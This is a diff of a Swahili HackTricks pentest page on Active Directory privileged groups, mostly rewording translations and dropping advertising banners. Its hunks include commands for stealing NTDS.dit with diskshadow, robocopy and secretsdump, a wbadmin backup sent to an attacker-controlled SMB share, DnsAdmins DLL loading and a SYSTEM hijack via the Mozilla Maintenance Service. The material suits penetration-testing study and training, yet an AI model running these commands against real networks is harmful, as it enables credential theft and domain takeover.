@@ -1,23 +1,16 @@
-# Vikundi vya Kipekee
+# Privileged Groups
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
+## Well Known groups with administration privileges
 
-Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kujenga na **kujiendesha** kwa urahisi kazi zinazotumiwa na zana za jamii **zilizoendelea zaidi** duniani.\
-Pata Ufikiaji Leo:
+- **Administrators**
+- **Domain Admins**
+- **Enterprise Admins**
 
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+## Account Operators
 
-## Vikundi Vinavyojulikana na Privilege za Usimamizi
-
-- **Wasimamizi**
-- **Wasimamizi wa Kikoa**
-- **Wasimamizi wa Biashara**
-
-## Opereta wa Akaunti
-
-Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Kituo cha Kikoa (DC).
+Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Domain Controller (DC).
 
 Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
 ```powershell
@@ -47,13 +40,13 @@ Uanachama katika kundi hili unaruhusu kusoma vitu vilivyofutwa vya Active Direct
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Domain Controller Access
+### Ufikiaji wa Kituo cha Kikoa
 
-Upatikanaji wa faili kwenye DC umepunguziliwa mbali isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha upatikanaji.
+Ufikiaji wa faili kwenye DC umewekwa mipaka isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha ufikiaji.
 
-### Privilege Escalation
+### Kuinua Haki
 
-Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, linalowezesha utekelezaji wa amri zisizo na mipaka na kupandisha hadhi:
+Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, linalowezesha utekelezaji wa amri za kiholela na kuinua haki:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -61,7 +54,7 @@ Amri hii inaonyesha kwamba `Server Operators` wana ufikiaji kamili, wakiruhusu k
 
 ## Backup Operators
 
-Uanachama katika kundi la `Backup Operators` unatoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na haki za `SeBackup` na `SeRestore`. Haki hizi zinaruhusu kupita kwenye folda, kuorodhesha, na uwezo wa kunakili faili, hata bila ruhusa maalum, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.
+Uanachama katika kundi la `Backup Operators` unatoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na haki za `SeBackup` na `SeRestore`. Haki hizi zinaruhusu kupita kwenye folda, kuorodhesha, na uwezo wa kunakili faili, hata bila ruhusa maalum, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia skripti maalum ni muhimu kwa mchakato huu.
 
 Ili kuorodhesha wanachama wa kundi, tekeleza:
 ```powershell
@@ -81,14 +74,14 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Pata na nakili faili kutoka kwa saraka zilizozuiliwa, kwa mfano:
+3. Pata na nakili faili kutoka kwa saraka zilizo na vizuizi, kwa mfano:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
 ### AD Attack
 
-Upatikanaji wa moja kwa moja wa mfumo wa faili wa Domain Controller unaruhusu wizi wa hifadhidata ya `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za eneo.
+Upatikanaji wa moja kwa moja wa mfumo wa faili wa Kituo cha Kikoa unaruhusu wizi wa hifadhidata ya `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za kikoa.
 
 #### Using diskshadow.exe
 
@@ -109,7 +102,7 @@ exit
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-Mbadala yake, tumia `robocopy` kwa ajili ya nakala za faili:
+Mbali na hayo, tumia `robocopy` kwa ajili ya nakala za faili:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -124,8 +117,8 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Kutumia wbadmin.exe
 
-1. Weka mfumo wa faili wa NTFS kwa ajili ya seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akauti za SMB kwenye mashine lengwa.
-2. Tumia `wbadmin.exe` kwa ajili ya akiba ya mfumo na uondoaji wa `NTDS.dit`:
+1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akreditivu za SMB kwenye mashine lengwa.
+2. Tumia `wbadmin.exe` kwa ajili ya akiba ya mfumo na uchimbaji wa `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -137,9 +130,9 @@ Kwa maonyesho ya vitendo, angalia [DEMO VIDEO WITH IPPSEC](https://www.youtube.c
 
 ## DnsAdmins
 
-Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka yenye mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wajenzi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi. 
+Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka yenye mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wasimamizi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.
 
-Ili kuorodhesha wajumbe wa kundi la DnsAdmins, tumia:
+Ili orodhesha wajumbe wa kundi la DnsAdmins, tumia:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
@@ -180,7 +173,7 @@ Pia inawezekana kutumia mimilib.dll kwa ajili ya utekelezaji wa amri, kuibadilis
 
 DnsAdmins wanaweza kubadilisha rekodi za DNS ili kufanya shambulio la Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya kimataifa. Zana kama Responder au Inveigh zinaweza kutumika kwa ajili ya kudanganya na kukamata trafiki ya mtandao.
 
-### Wasomaji wa Kumbukumbu za Matukio
+### Wasilishi wa Kumbukumbu za Matukio
 Wajumbe wanaweza kufikia kumbukumbu za matukio, huenda wakapata taarifa nyeti kama nywila za maandiko au maelezo ya utekelezaji wa amri:
 ```powershell
 # Get members and search logs for sensitive information
@@ -196,11 +189,11 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Wataalam wa Hyper-V
 
-Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
+Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambayo inaweza kutumika kuteka udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
 
 ### Mfano wa Kutumia
 
-Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumiwa na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
+Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumika na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -216,7 +209,7 @@ Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojuli
 
 #### Opereta wa Print
 
-Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kituo cha Kikoa**, kuzima, na kusimamia printa. Ili kutekeleza haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na kiwango, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
+Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kituo cha Kikoa**, kuzima, na kusimamia printa. Ili kutekeleza haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na hadhi, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
 
 Ili kuorodhesha wajumbe wa kundi hili, amri ifuatayo ya PowerShell inatumika:
 ```powershell
@@ -233,14 +226,14 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users
 ```
 Maelezo zaidi kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za pentesting.
 
-#### Watumiaji wa Usimamizi wa KijRemote
+#### Watumiaji wa Usimamizi wa Kijijini
 
-Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhesabu wa wajumbe hawa unapatikana kupitia:
+Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhesabuji wa wajumbe hawa unafanywa kupitia:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutumika.
+Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutazamwa.
 
 #### Watoa Huduma wa Seva
 
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kujenga na **kujiendesha** kazi kwa urahisi zenye nguvu za zana za jamii **za kisasa zaidi** duniani.\
-Pata Ufikiaji Leo:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
